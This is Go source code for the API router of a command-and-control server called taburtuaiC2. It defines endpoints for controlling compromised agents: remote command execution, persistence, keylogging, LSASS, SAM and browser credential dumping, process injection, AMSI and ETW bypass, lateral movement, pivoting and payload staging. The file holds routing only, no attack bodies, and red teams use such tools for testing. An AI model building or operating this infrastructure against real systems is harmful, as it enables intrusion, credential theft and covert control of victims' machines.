package api

import (
	"net/http"
	"os"
	"strings"

	"github.com/gin-gonic/gin"
	"github.com/mjopsec/taburtuaiC2/internal/core"
	"github.com/mjopsec/taburtuaiC2/pkg/profiles"
)

// Router handles API routing
type Router struct {
	server     *core.Server
	handlers   *Handlers
	middleware *Middleware
}

// NewRouter creates a new router
func NewRouter(server *core.Server) *Router {
	return &Router{
		server:     server,
		handlers:   NewHandlers(server),
		middleware: NewMiddleware(server),
	}
}

// Setup configures all routes
func (r *Router) Setup() *gin.Engine {
	router := gin.New()

	// Global middleware (no body-size limit here — applied per group below)
	router.Use(gin.Recovery())
	router.Use(r.middleware.ErrorRecovery())
	router.Use(r.middleware.SecurityHeaders())
	router.Use(r.middleware.CORS())
	router.Use(r.middleware.ValidateContentType())
	router.Use(r.middleware.Logging())
	router.Use(r.middleware.RateLimit())
	router.Use(r.middleware.Auth())

	// Vue SPA — serve dist/ if built, otherwise a minimal placeholder
	spaRoot := "./web/dist"
	if _, err := os.Stat(spaRoot); err == nil {
		router.Static("/assets", spaRoot+"/assets")
		router.StaticFile("/favicon.ico", spaRoot+"/favicon.ico")
		// Catch-all: serve index.html for any non-API, non-stage path
		router.NoRoute(func(c *gin.Context) {
			p := c.Request.URL.Path
			if strings.HasPrefix(p, "/api/") || strings.HasPrefix(p, "/stage/") {
				c.Status(http.StatusNotFound)
				return
			}
			c.File(spaRoot + "/index.html")
		})
	}

	// ── Routes with 10 MB body limit ─────────────────────────────────────────
	// All standard API routes. The limit is applied at the group level so it
	// is installed once (before the route handler) and wraps the raw body.
	v1 := router.Group("/api/v1")
	v1.Use(r.middleware.RequestSizeLimit(10 * 1024 * 1024))
	{
		// Agent management
		v1.GET("/agents", r.handlers.ListAgents)
		v1.GET("/agents/:id", r.handlers.GetAgent)
		v1.DELETE("/agents/:id", r.handlers.RemoveAgent)
		v1.POST("/checkin", r.handlers.AgentCheckin)

		// Command execution
		v1.POST("/command", r.handlers.ExecuteCommand)
		v1.GET("/command/:id/next", r.handlers.GetNextCommand)
		v1.POST("/command/result", r.handlers.SubmitCommandResult)
		v1.GET("/command/:id/status", r.handlers.GetCommandStatus)

		// Command listing
		v1.GET("/commands", r.handlers.ListAllCommands)

		// Agent commands
		v1.GET("/agent/:id/commands", r.handlers.GetAgentCommands)
		v1.DELETE("/agent/:id/queue", r.handlers.ClearAgentQueue)

		// File download (agent → operator)
		v1.POST("/agent/:id/download", r.handlers.DownloadFromAgent)

		// Process management
		v1.POST("/agent/:id/process/list", r.handlers.ListProcesses)
		v1.POST("/agent/:id/process/kill", r.handlers.KillProcess)
		v1.POST("/agent/:id/process/start", r.handlers.StartProcess)

		// Persistence
		v1.POST("/agent/:id/persistence/setup", r.handlers.SetupPersistence)
		v1.POST("/agent/:id/persistence/remove", r.handlers.RemovePersistence)

		// ADS & LOLBin
		v1.POST("/agent/:id/ads/exec", r.handlers.ADSExec)
		v1.POST("/agent/:id/fetch", r.handlers.LOLBinFetch)

		// Phase 2 — injection / timestomp
		v1.POST("/agent/:id/inject/remote", r.handlers.InjectRemote)
		v1.POST("/agent/:id/inject/self", r.handlers.InjectSelf)
		v1.POST("/agent/:id/timestomp", r.handlers.Timestomp)
		v1.POST("/agent/:id/process/ppid", r.handlers.PPIDSpawn)

		// Phase 3 — AMSI/ETW bypass
		v1.POST("/agent/:id/bypass/amsi", r.handlers.AMSIBypass)
		v1.POST("/agent/:id/bypass/etw", r.handlers.ETWBypass)

		// Phase 3 — Token manipulation
		v1.POST("/agent/:id/token/list", r.handlers.TokenList)
		v1.POST("/agent/:id/token/steal", r.handlers.TokenSteal)
		v1.POST("/agent/:id/token/make", r.handlers.TokenMake)
		v1.POST("/agent/:id/token/revert", r.handlers.TokenRevert)
		v1.POST("/agent/:id/token/runas", r.handlers.TokenRunAs)

		// Phase 3 — Reconnaissance
		v1.POST("/agent/:id/screenshot", r.handlers.Screenshot)
		v1.POST("/agent/:id/keylog/start", r.handlers.KeylogStart)
		v1.POST("/agent/:id/keylog/dump", r.handlers.KeylogDump)
		v1.POST("/agent/:id/keylog/stop", r.handlers.KeylogStop)
		v1.POST("/agent/:id/keylog/clear", r.handlers.KeylogClear)

		// Phase 4 — Advanced injection
		v1.POST("/agent/:id/inject/hollow", r.handlers.Hollow)
		v1.POST("/agent/:id/inject/hijack", r.handlers.Hijack)
		v1.POST("/agent/:id/inject/stomp", r.handlers.Stomp)
		v1.POST("/agent/:id/inject/map", r.handlers.MapInject)

		// Phase 5 — Credential access
		v1.POST("/agent/:id/creds/lsass", r.handlers.LSASSDump)
		v1.POST("/agent/:id/creds/sam", r.handlers.SAMDump)
		v1.POST("/agent/:id/creds/browser", r.handlers.BrowserCreds)
		v1.POST("/agent/:id/creds/clipboard", r.handlers.ClipboardRead)

		// Phase 6-7 — Evasion
		v1.POST("/agent/:id/evasion/sleep", r.handlers.SleepObf)
		v1.POST("/agent/:id/evasion/unhook", r.handlers.UnhookNTDLL)

		// Phase 8 — Hardware breakpoints
		v1.POST("/agent/:id/evasion/hwbp/set", r.handlers.HWBPSet)
		v1.POST("/agent/:id/evasion/hwbp/clear", r.handlers.HWBPClear)

		// Phase 9 — BOF execution
		v1.POST("/agent/:id/bof", r.handlers.BOFExec)

		// Phase 10 — OPSEC
		v1.POST("/agent/:id/opsec/antidebug", r.handlers.AntiDebug)
		v1.POST("/agent/:id/opsec/antivm", r.handlers.AntiVM)
		v1.POST("/agent/:id/opsec/timegate", r.handlers.TimeGateSet)

		// Phase 11 — Network recon
		v1.POST("/agent/:id/pivot/netscan", r.handlers.NetScan)
		v1.POST("/agent/:id/pivot/arpscan", r.handlers.ARPScan)

		// Phase 11 — Registry
		v1.POST("/agent/:id/registry/read", r.handlers.RegRead)
		v1.POST("/agent/:id/registry/write", r.handlers.RegWrite)
		v1.POST("/agent/:id/registry/delete", r.handlers.RegDelete)
		v1.POST("/agent/:id/registry/list", r.handlers.RegList)

		// Phase 11 — SOCKS5 pivot
		v1.POST("/agent/:id/pivot/socks5/start", r.handlers.SOCKS5Start)
		v1.POST("/agent/:id/pivot/socks5/stop", r.handlers.SOCKS5Stop)
		v1.POST("/agent/:id/pivot/socks5/status", r.handlers.SOCKS5Status)

		// Lateral movement — agent executes command on a remote host
		v1.POST("/agent/:id/lateral/wmi", r.handlers.LateralWMI)
		v1.POST("/agent/:id/lateral/winrm", r.handlers.LateralWinRM)
		v1.POST("/agent/:id/lateral/schtask", r.handlers.LateralSchtask)
		v1.POST("/agent/:id/lateral/service", r.handlers.LateralService)
		v1.POST("/agent/:id/lateral/dcom", r.handlers.LateralDCOM)

		// Port forwarding — operator creates a tunnel, agent relays to internal target
		v1.POST("/agent/:id/portfwd", r.handlers.PortFwdCreate)
		v1.GET("/portfwd", r.handlers.PortFwdList)
		v1.DELETE("/portfwd/:sess", r.handlers.PortFwdDelete)
		// Relay endpoints — called by the agent, no auth (token guards access)
		v1.GET("/portfwd/:sess/pull", r.handlers.PortFwdPull)
		v1.POST("/portfwd/:sess/push", r.handlers.PortFwdPush)

		// Stage management (list + delete are tiny)
		v1.GET("/stages", r.handlers.ListStages)
		v1.DELETE("/stage/:token", r.handlers.DeleteStage)

		// Monitoring
		v1.GET("/stats", r.handlers.GetStats)
		v1.GET("/health", r.handlers.HealthCheck)
		v1.GET("/logs", r.handlers.GetLogs)
		v1.GET("/queue/stats", r.handlers.GetQueueStats)

		// Phase 11.7 — Multi-operator team server (RBAC)
		v1.POST("/team/register", r.handlers.RegisterOperator)
		v1.GET("/team/operators", r.handlers.ListOperators)
		v1.POST("/team/operator/:sid/role", r.handlers.PromoteOperator)
		v1.POST("/team/agent/:id/claim", r.handlers.ClaimAgent)
		v1.POST("/team/agent/:id/release", r.handlers.ReleaseAgent)
		v1.GET("/team/agent/:id/claim", r.handlers.AgentClaimStatus)
		v1.POST("/team/broadcast", r.handlers.BroadcastEvent)
	}

	// SSE stream — must be outside the 10 MB body-limit group
	router.GET("/api/v1/team/events", r.handlers.EventStream)

	// ── Routes that manage their own (large) body limits ─────────────────────
	// These are on a separate group so the 10 MB group middleware above does
	// not wrap their bodies before their own MaxBytesReader runs.
	upload := router.Group("/api/v1")
	{
		// Operator → agent file push (up to 100 MB)
		upload.POST("/agent/:id/upload", func(c *gin.Context) {
			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
			r.handlers.UploadToAgent(c)
		})

		// Stage payload upload — base64 JSON, up to ~67 MB for a 50 MB binary
		upload.POST("/stage", func(c *gin.Context) {
			c.Request.Body = http.MaxBytesReader(c.Writer, c.Request.Body, 100*1024*1024)
			r.handlers.CreateStage(c)
		})
	}

	// Public stage delivery endpoint — no auth, token is the credential
	router.GET("/stage/:token", r.handlers.ServeStage)

	return router
}

// RegisterProfileAliases adds alias routes for a non-default C2 profile so
// agents using that profile can reach the same handlers via their profile URIs.
// Call this after Setup() on the returned *gin.Engine.
func (r *Router) RegisterProfileAliases(engine *gin.Engine, profileName string) {
	if profileName == "" || profileName == "default" {
		return
	}
	p := profiles.Get(profileName)
	if p.Name == "default" {
		return // unknown profile name — Get() fell back to default, skip
	}

	// Checkin alias
	engine.POST(p.CheckinPath, r.handlers.AgentCheckin)

	// Command-next alias — gin pattern uses :id instead of {agent_id}
	engine.GET(p.CommandGinPattern(), r.handlers.GetNextCommand)

	// Result alias
	engine.POST(p.ResultPath, r.handlers.SubmitCommandResult)
}
